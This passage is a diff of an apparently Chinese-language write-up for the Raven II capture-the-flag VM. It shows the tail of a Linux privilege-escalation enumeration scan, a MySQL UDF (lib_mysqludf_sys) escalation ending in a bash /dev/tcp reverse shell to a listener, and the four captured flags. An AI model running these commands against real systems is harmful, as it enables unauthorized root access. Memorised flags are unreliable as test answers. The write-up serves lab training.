 -rw-r--r-- 1 root root 84 Apr  9  2017 network-pre.conf
-
 /lib/systemd/network:
 total 12K
 -rw-r--r-- 1 root root 368 Apr  9  2017 80-container-host0.network
 -rw-r--r-- 1 root root 378 Apr  9  2017 80-container-ve.network
 -rw-r--r-- 1 root root  73 Apr  9  2017 99-default.link
-
 /lib/systemd/system-generators:
 total 408K
 -rwxr-xr-x 1 root root 47K Apr  9  2017 systemd-cryptsetup-generator
@@ -1207,37 +1148,24 @@ total 408K
 -rwxr-xr-x 1 root root 27K Apr  9  2017 systemd-rc-local-generator
 -rwxr-xr-x 1 root root 23K Apr  9  2017 systemd-system-update-generator
 -rwxr-xr-x 1 root root 51K Apr  9  2017 systemd-sysv-generator
-
 /lib/systemd/system-preset:
 total 4.0K
 -rw-r--r-- 1 root root 872 Apr  9  2017 90-systemd.preset
-
 /lib/systemd/system-shutdown:
 total 0
-
 /lib/systemd/system-sleep:
 total 0
-
-
 ### SOFTWARE #############################################
 [-] Sudo version:
 Sudo version 1.8.10p3
-
-
 [-] MYSQL version:
 mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3
-
-
 [-] Apache version:
 Server version: Apache/2.4.10 (Debian)
 Server built:   Mar 31 2018 09:39:03
-
-
 [-] Apache user configuration:
 APACHE_RUN_USER=www-data
 APACHE_RUN_GROUP=www-data
-
-
 [-] Installed Apache modules:
 Loaded Modules:
  core_module (static)
@@ -1268,28 +1196,20 @@ Loaded Modules:
  reqtimeout_module (shared)
  setenvif_module (shared)
  status_module (shared)
-
-
 ### INTERESTING FILES ####################################
 [-] Useful file locations:
 /bin/nc
 /bin/netcat
 /usr/bin/wget
 /usr/bin/gcc
-
-
 [-] Installed compilers:
 ii  gcc                            4:4.9.2-2                          amd64        GNU C compiler
 ii  gcc-4.9                        4.9.2-10+deb8u1                    amd64        GNU C compiler
-
-
 [-] Can we read/write sensitive files:
 -rw-r--r-- 1 root root 1680 Aug 13  2018 /etc/passwd
 -rw-r--r-- 1 root root 804 Aug 13  2018 /etc/group
 -rw-r--r-- 1 root root 761 Oct 23  2014 /etc/profile
 -rw-r----- 1 root shadow 1173 Nov  9  2018 /etc/shadow
-
-
 [-] SUID files:
 -rwsr-xr-x 1 root root 40000 Mar 30  2015 /bin/mount
 -rwsr-xr-x 1 root root 27416 Mar 30  2015 /bin/umount
@@ -1307,8 +1227,6 @@ ii  gcc-4.9                        4.9.2-10+deb8u1                    amd64     
 -rwsr-xr-x 1 root root 10104 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
 -rwsr-xr-x 1 root root 10240 Feb 13  2017 /usr/sbin/sensible-mda
 -rwsr-xr-x 1 root root 90456 Aug 13  2014 /sbin/mount.nfs
-
-
 [-] SGID files:
 -rwsr-sr-x 1 root mail 89248 Nov 19  2017 /usr/bin/procmail
 -rwxr-sr-x 3 root mail 10984 Dec  3  2012 /usr/bin/mail-touchlock
@@ -1328,22 +1246,14 @@ ii  gcc-4.9                        4.9.2-10+deb8u1                    amd64     
 -rwxr-sr-x 1 root smmsp 74816 Feb 13  2017 /usr/lib/sm.bin/mailstats
 -rwxr-sr-x 1 root smmsp 811776 Feb 13  2017 /usr/lib/sm.bin/sendmail
 -rwxr-sr-x 1 root shadow 35408 May 28  2017 /sbin/unix_chkpwd
-
-
 [+] Files with POSIX capabilities set:
 /bin/ping6 = cap_net_raw+ep
 /bin/ping = cap_net_raw+ep
 /usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
-
-
 [-] Can't search *.conf files as no keyword was entered
-
 [-] Can't search *.php files as no keyword was entered
-
 [-] Can't search *.log files as no keyword was entered
-
 [-] Can't search *.ini files as no keyword was entered
-
 [-] All *.conf files in /etc (recursive 1 level):
 -rw-r--r-- 1 root root 3173 Mar 20  2018 /etc/reportbug.conf
 -rw-r--r-- 1 root root 2981 Aug 13  2018 /etc/adduser.conf
@@ -1367,79 +1277,86 @@ ii  gcc-4.9                        4.9.2-10+deb8u1                    amd64     
 -rw-r--r-- 1 root root 2584 Feb  7  2014 /etc/gai.conf
 -rw-r--r-- 1 root root 6822 Aug 13  2018 /etc/ca-certificates.conf
 -rw-r--r-- 1 root root 279 Jun 13  2013 /etc/updatedb.conf
-
-
 [-] Current user's history files:
 -rw------- 1 www-data www-data 3 Aug 13  2018 /var/www/.bash_history
-
-
 [-] Any interesting mail in /var/mail:
 total 356
 drwxrwsrwt  2 root     mail   4096 May 29 03:12 .
 drwxr-xr-x 12 root     root   4096 Aug 13  2018 ..
 -rw-rw----  1 michael  mail 231973 May 29 03:12 michael
 -rw-rw----  1 www-data mail 113221 May 28 14:47 www-data
-
-
 ### SCAN COMPLETE ####################################
 ```
-<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/5.png" width="56%">
+</details>
+
+<img src="https://github.com/eagleat`man`/mywriteup/blob/main/mysqludf/images/5.png" width="56%">
 
 **其中有一个，mysql的服务还加载了插件目录**
-```/usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306```
-> create table foo(line blob);
-> insert into foo values(load_file('/tmp/lib_mysqludf_sys.so'));
-> create function sys_eval returns string soname 'lib_mysqludf_sys.so';
-> mysql> select * from mysql.func
-> select * from mysql.func
->     -> ;
-> ;
-> +----------+-----+---------------------+----------+
-> | name     | ret | dl                  | type     |
-> +----------+-----+---------------------+----------+
-> | sys_eval |   0 | lib_mysqludf_sys.so | function |
-> +----------+-----+---------------------+----------+
-> 1 row in set (0.00 sec)
-> kali监听：nc -lvp 5555
-> mysql> select sys_eval("bash -c 'exec bash -i &>/dev/tcp/192.168.0.100/5555 <&1'");
-成功拿到root权限
-<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/6.png" width="56%">
-> 至于flag，大家自己找吧，我知道的应该就4个
-> root@Raven:/var/www/html/vendor# cat PATH
-> cat PATH
-> /var/www/html/vendor/
-> flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
+~~~shell
+/usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
+~~~
 
-> root@Raven:/var/www# cat flag2.txt
-> cat flag2.txt
-> flag2{6a8ed560f0b5358ecf844108048eb337}
+<details>
+<summary>sql提权过程</summary>
+
+```sql
+create table foo(line blob);
+insert into foo values(load_file('/tmp/lib_mysqludf_sys.so')); 
+create function sys_eval returns string soname 'lib_mysqludf_sys.so';
+mysql> select * from mysql.func
+select * from mysql.func;
+ +----------+-----+---------------------+----------+
+ | name     | ret | dl                  | type     |
+ +----------+-----+---------------------+----------+
+ | sys_eval |   0 | lib_mysqludf_sys.so | function |
+ +----------+-----+---------------------+----------+
+ 1 row in set (0.00 sec)
+
+# kali监听：nc -lvp 5555
+mysql> select sys_eval("bash -c 'exec bash -i &>/dev/tcp/192.168.0.100/5555 <&1'");
+ ```
+
+</details>
 
 
-> root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/> 11# ls -al
-> ls -al
-> total 20
-> drwxrwxrwx 2 www-data www-data  4096 Nov  9  2018 .
-> drwxrwxrwx 3 www-data www-data  4096 Nov  9  2018 ..
-> -rw-rw-rw- 1 www-data www-data 10411 Nov  9  2018 flag3.png
-> root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/11# cp flag3.png /var/www/html  # 复制到网站目录
-> root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/11# chmod 777 /var/www/html/flag3.png  # 添加访问权限
-<img src="https://github.com/eagleatman/mywriteup/blob/main/mysqludf/images/7.png" width="56%">
-> root@Raven:/root# cat flag4.txt
-> cat flag4.txt
->   ___                   ___ ___
->  | _ \__ ___ _____ _ _ |_ _|_ _|
->  |   / _` \ V / -_) ' \ | | | |
->  |_|_\__,_|\_/\___|_||_|___|___|
-> 
-> flag4{df2bc5e951d91581467bb9a2a8ff4425}
-> 
-> CONGRATULATIONS on successfully rooting RavenII
-> 
-> I hope you enjoyed this second interation of the Raven VM
-> 
-> Hit me up on Twitter and let me know what you thought:
-> 
-> @mccannwj / wjmccann.github.io
+> 成功拿到root权限
+<img src="https://github.com/eagleat`man`/mywriteup/blob/main/mysqludf/images/6.png" width="56%">
+
+<details>
+<summary>7. 至于flag，大家自己找吧，我知道的应该就4个:</summary>
+
+```shell
+root@Raven:/var/www/html/vendor# cat PATH
+cat PATH
+/var/www/html/vendor/
+flag1{a2c1f66d2b8051bd3a5874b5b6e43e21}
+root@Raven:/var/www# cat flag2.txt
+cat flag2.txt
+flag2{6a8ed560f0b5358ecf844108048eb337}
+root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/> 11# ls -al
+ls -al
+total 20
+drwxrwxrwx 2 www-data www-data  4096 Nov  9  2018 .
+drwxrwxrwx 3 www-data www-data  4096 Nov  9  2018 ..
+-rw-rw-rw- 1 www-data www-data 10411 Nov  9  2018 flag3.png
+root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/11# cp flag3.png /var/www/html  # 复制到网站目录
+root@Raven:/var/www/html/wordpress/wp-content/uploads/2018/11# chmod 777 /var/www/html/flag3.png  # 添加访问权限
+<img src="https://github.com/eagleat`man`/mywriteup/blob/main/mysqludf/images/7.png" width="56%">
+root@Raven:/root# cat flag4.txt
+cat flag4.txt
+  ___                   ___ ___
+ | _ \__ ___ _____ _ _ |_ _|_ _|
+ |   / _` \ V / -_) ' \ | | | |
+ |_|_\__,_|\_/\___|_||_|___|___|
+flag4{df2bc5e951d91581467bb9a2a8ff4425}
+CONGRATULATIONS on successfully rooting RavenII
+I hope you enjoyed this second interation of the Raven VM
+Hit me up on Twitter and let me know what you thought:
+@mccannwj / wjmccann.github.io
+```
+
+</details>
+ 
 
 ## 1.2. window
 
